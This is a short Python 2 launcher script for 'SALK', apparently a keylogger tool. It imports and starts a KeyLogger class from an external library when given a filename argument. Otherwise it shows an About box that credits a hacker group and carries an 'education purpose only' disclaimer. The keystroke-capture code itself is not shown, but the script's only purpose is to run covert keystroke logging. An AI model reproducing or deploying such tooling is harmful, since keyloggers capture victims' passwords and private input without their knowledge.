if __name__=='__main__':
    from salklib import KeyLogger
    import sys
    try:
        sys.argv[1]
        kl = KeyLogger()
    except:
        import tkMessageBox
        tkMessageBox.showinfo("About SALK", "Sarath Kumar\nWeb:www.fb.com/sarathtvmala\nUsage:salk.exe <filename>\nUse Education purpose only\n***Quad-K H4C3RS GROUP***")